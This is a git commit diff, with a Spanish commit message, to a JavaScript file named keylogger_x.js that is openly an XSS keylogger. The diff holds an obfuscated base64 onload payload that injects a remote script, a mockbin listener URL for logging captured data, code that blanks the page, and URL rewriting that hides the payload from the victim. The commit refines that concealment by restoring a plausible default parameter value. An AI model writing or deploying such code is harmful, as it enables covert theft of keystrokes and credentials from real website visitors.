cae42a769e245d062db7b016f25d52534d416611
CTPache <33907485+CTPache@users.noreply.github.com>
2024-03-27 17:56:43 +0100

    Añadido valor por defecto al parámetro vulnerable

--- keylogger_x.js
+++ keylogger_x.js
@@ -1,11 +1,12 @@
 var https_listener_for_logging = 'https://1f84a21f49834055849d5bce74489025.api.mockbin.io/'
 var param_vuln = 'lang'
+var param_default = 'ES-ES'
 var payload_vuln = "\"onload=\"eval(atob('Y29uc3Qgbm9kZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO25vZGUuc2V0QXR0cmlidXRlKCJzcmMiLCJodHRwczovL2N0cGFjaGUuZ2l0aHViLmlvL1hTUy9rZXlsb2dnZXJfeC5qcyIpO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF0uYXBwZW5kQ2hpbGQobm9kZSk7'))"
 // Borramos el contenido para que parezca que sigue cargando
 document.body.innerHTML = '';
 // Esto cambia la URL que muestra el navegador, para que no se vea el payload
 let newUrl = new URL(window.location.href)
-newUrl.searchParams.set(param_vuln, '')
+newUrl.searchParams.set(param_vuln, param_default)
 history.pushState({ path: newUrl.href }, '', newUrl.href);
 
 //Clona la web original
